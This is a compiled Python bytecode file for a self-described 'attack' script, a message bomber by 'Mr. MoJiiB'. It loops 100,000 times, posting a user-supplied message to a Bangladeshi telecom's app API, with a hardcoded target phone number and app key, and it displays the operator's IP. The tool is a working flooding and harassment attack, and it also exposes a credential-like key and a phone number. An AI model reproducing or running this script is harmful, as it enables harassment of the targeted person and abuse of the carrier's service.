o
    ��b�  �                   @   s  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeeed ��Zeed��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ de d Ze� Zded < d!ed"< eed#< ed$�D ]"Zzejeed%�Ze�d&� eeej  � W q�   eed' � Y q�eee	d( e
 d) e	 d* ��Z!e �d� d dl Z e �d� dS )+�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZpudinaZword� r   �st.py�	logoprint   s
   
�r   z[>] Enter Your Message: z[>] Enter Api Key: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz�https://circle.robi.com.bd/mylife/appapi/appcall.php?op=performAction&app_version=81&action=kast&msgId=62&msisdn=8801875409158&message=z&retry=false�gzipz
User-AgentZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-keyz	x-api-keyi�� )�headersg�����|�=z
errorz 
 Pressz Enterz To Exit)"�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�input�a�x�getZresponser
   ZjsonZrequests.structuresr   Zurlr   �range�iZpostZresp�textZxnr   r   r   r   �<module>   sd   




	
 
